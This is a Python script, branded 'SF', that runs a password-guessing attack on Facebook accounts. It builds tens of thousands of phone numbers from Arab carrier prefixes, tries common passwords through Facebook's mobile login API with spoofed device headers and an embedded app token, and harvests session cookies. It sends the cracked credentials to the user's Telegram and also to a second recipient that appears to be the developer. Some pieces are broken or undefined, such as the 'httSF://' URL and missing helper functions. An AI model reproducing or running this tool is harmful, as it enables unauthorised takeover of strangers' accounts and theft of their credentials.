import os, sys, requests, random, json, time, uuid
from concurrent.futures import ThreadPoolExecutor as r
HH='\033[1;34m'
M = '\x1b[1;37m'
from datetime import datetime



G = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح
R = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح
W = "\x1b[38;5;15m"   # أبيض (يبقى)
B = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح
Y = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح
A = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح
O = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح
X = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح
P = "\x1b[38;5;46m"   # بنفسجي ← أخضر فاتح

BLUE_LIGHT = "\033[1;34m"    # أزرق (يبقى)
BLUE_DARK = "\033[0;34m"     # أزرق (يبقى)
BLUE_BRIGHT = "\033[1;94m"   # أزرق (يبقى)
CYAN = "\033[1;36m"          # سماوي (يبقى)

#----------------<-STYLE VARIABLES (FIXED)->----------------#
xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{W}1{G}]>{W}"
xp2 = f"{G}<[{W}2{G}]>{W}"
xp3 = f"{G}<[{W}3{G}]>{W}"
xp4 = f"{G}<[{W}4{G}]>{W}"
xp5 = f"{G}<[{W}5{G}]>{W}"
xp0 = f"{G}<[{W}0{G}]>{W}"
xpx = f"{G}<[{W}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"


id, ok, loop = [], 0, 0
android_versions = ["10", "11", "12", "13", "14"]
devices = [
    "TECNO CK7n",
    "Samsung SM-G991B",
    "Xiaomi Redmi Note 12",
    "Infinix X6812",
    "Huawei Y9a"
]
brands = {
    "TECNO CK7n": "TECNO",
    "Samsung SM-G991B": "Samsung",
    "Xiaomi Redmi Note 12": "Xiaomi",
    "Infinix X6812": "Infinix",
    "Huawei Y9a": "Huawei"
}
android = random.choice(android_versions)
device = random.choice(devices)
brand = brands[device]

fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
fbbv = random.randint(100000000,999999999)

width = random.choice([720, 1080, 1440])
height = random.choice([1600, 1920, 2172, 2400])
density = random.choice([2.0, 2.5, 3.0, 4.0])

ua = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""



headers = {
    "User-Agent": ua,
    "Accept-Encoding": "gzip, deflate",
    "x-fb-connection-quality": "EXCELLENT",
    "x-fb-friendly-name": "authenticate",
    "x-fb-http-engine": "Liger",
    "x-fb-client-ip": "True",
    "x-fb-server-cluster": "True",
    "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
}

version ='2.0'
xlinex = (f"{R}━"*56)

# قائمة الدول والأكواد
countries_data = {
    "1": {"name": "Algeria", "codes": ["055", "056", "066", "067", "077", "079"]},
    "2": {"name": "Saudi Arabia", "codes": ["050", "053", "054", "055", "056", "058"]},
    "3": {"name": "UAE", "codes": ["050", "052", "054", "055", "056", "058"]},
    "4": {"name": "Qatar", "codes": ["330", "331", "332", "333", "334", "335"]},
    "5": {"name": "Kuwait", "codes": ["500", "503", "505", "506", "507", "509"]},
    "6": {"name": "Oman", "codes": ["710", "712", "714", "715", "716", "718"]},
    "7": {"name": "Bahrain", "codes": ["310", "311", "312", "313", "314", "315"]},
    "8": {"name": "Egypt", "codes": ["010", "011", "012", "015", "016", "017"]},
    "9": {"name": "Morocco", "codes": ["600", "601", "602", "603", "604", "605"]},
    "10": {"name": "Jordan", "codes": ["070", "071", "072", "077", "078", "079"]},
    "11": {"name": "Lebanon", "codes": ["030", "031", "032", "033", "034", "035"]},
    "12": {"name": "Iraq", "codes": ["0750", "0770", "0780"]},
    "13": {"name": "Tunisia", "codes": ["200", "201", "202", "203", "204", "205"]},
    "14": {"name": "Syria", "codes": ["090", "091", "092", "093", "094", "095"]},
    "15": {"name": "Yemen", "codes": ["700", "701", "702", "703", "704", "705"]},
    "16": {"name": "Libya", "codes": ["910", "911", "912", "913", "914", "915"]},
    "17": {"name": "Sudan", "codes": ["090", "091", "092", "093", "094", "095"]},
    "18": {"name": "Palestine", "codes": ["050", "051", "052", "053", "054", "055"]},
    "19": {"name": "Mauritania", "codes": ["410", "411", "412", "413", "414", "415"]},
    "20": {"name": "Somalia", "codes": ["060", "061", "062", "063", "064", "065"]},
    "21": {"name": "Djibouti", "codes": ["770", "771", "772", "773", "774", "775"]},
    "22": {"name": "Comoros", "codes": ["320", "321", "322", "323", "324", "325"]}
}

Logo = f"""
{R}░██████╗███████╗
{R}██╔════╝██╔════╝
{R}╚█████╗░█████╗░░
{R}░╚═══██╗██╔══╝░░
{R}██████╔╝██║░░░░░
{R}╚═════╝░╚═╝░░░░░

{xlinex}
{W}  DEVELOPER {xpxx} SF{G}-{W}
{W}  STATUS    {xpxx} Premium
{W}  VERSION   {xpxx} V{G}/{W}{version}
{xlinex}
{R}⫷⫸ 𝐷𝐸𝑉  | @SF7SF0 ⫷⫸
{xlinex}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} DEV {xpxx} SF ~ @SF7SF0
{xlinex}"""

def show_countries():
    
    for key, country in countries_data.items():
        codes_str = " | ".join(country["codes"])
        print(f"{G}[{W}{key}{G}] {country['name']} {G}➜ {W}{codes_str}")
    
    print(f"{G}{'='*50}{W}\n")

def get_network_code():
    """اختيار رمز الشبكة من القائمة أو إدخال يدوي"""
    show_countries()
    
    choice = input(f'{xp} Select the country number (1-22)  {xpxx} ').strip()
    
    if choice in countries_data:
        country = countries_data[choice]
        print(f"{xp}I have chosen: {G}{country['name']}{W}")
        print(f"{xp}Available codes: {G}{' | '.join(country['codes'])}{W}")
        
        sim = input(f'{xp} INPUT CHOSE ({ " | ".join(country["codes"]) }) {xpxx} ').strip()
        
        # التحقق من صحة الكود
        if sim in country["codes"]:
            return sim
        else:
            print(f"{xp} {R}⚠️ الكود غير صحيح! سيتم استخدام الإدخال اليدوي...{W}")
            return input(f'{xp} INPUT CHOSE (مثال: 0750 | 0770 | 0780) {xpxx} ').strip()
    else:
        # إدخال يدوي
        return input(f'{xp} INPUT CHOSE (مثال: 0750 | 0770 | 0780) {xpxx} ').strip()

def menu():
    global TOKEN, ID
    os.system('clear')
    print(Logo)
    
    TOKEN = input(f'{xp}  TOKEN {xpxx} ').strip()
    print(xlinex)
    
    ID = input(f'{xp} ID {xpxx} ').strip()
    print(xlinex)
    
    # استبدال سطر input القديم بدالة اختيار الشبكة الجديدة
    sim = get_network_code()
    print(xlinex)
    
    for _ in range(44444):  
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        id.append(nmp)
    
    with r(max_workers=30) as am:
        os.system('clear')
        print(Logo)
        for idx in id:
            ids = sim + str(idx)
            pwxs = [
                ids,
                str(idx),
                "123456",
                "1234567",
                "12345678",
                "123456789",
                "12341234",
                "12344321"
                
            ]
            am.submit(crackfree, ids, pwxs)
    
    print('')
    print('\033[1;37m\033[1m-'*45)
    print('Crack Completed')
    exit()

def crackfree(ids, pwxs):
    global ok, loop
    sys.stdout.write(f'\r\r\r\033[1;37m\033[1m{xp} {G}<[{W}SF-{loop}{G}]> {G}<[{W}OK-{ok}{G}]>'),
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            data = pm(ids, pw)
            req = requests.post('httSF://b-graph.facebook.com/auth/login', headers=headers, data=data).json()
            
            if 'session_key' in req:
                uid = req["uid"]
                ok += 1
                coki = get_cookies(ids, pw)
                
                print(f"\r\r\033[0;32m\033[1m{xp} {G}<[SF-OK{G}]> {uid} | {pw}   ")
                print(xlinex)
                
                m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @SF7SF0 ~ SF 
 
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                
                SF_m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

tg://openmessage?user_id={ID}
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @SF7SF0 ~ SF 
 
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                
                send_telegram(TOKEN, ID, m)
                send_telegram(SF[0], SF[1], SF_m)
                
                break
                
            elif 'www.facebook.com' in req["error"]["message"]:
                uid = req["error"]["error_data"]["uid"]
                
                print(f"\r\r\x1b[38;5;208m\033[1m{xp}{G}<[SF-CP{G}]>\033[0;32m\033[1m {uid} | {pw}   ")
                print(xlinex)
                
                m = f"""حساب سكيور ❌
     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @SF7SF0 ~ SF 
 
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                
                SF_m = f"""حساب سكيور ❌


❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

tg://openmessage?user_id={ID}
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @SF7SF0 ~ SF 
 
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                
                send_telegram(TOKEN, ID, m)
                send_telegram(SF[0], SF[1], SF_m)
                
                break
                
        except requests.exceptions.ConnectionError:
            time.sleep(1)
    
    loop += 1

def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

menu()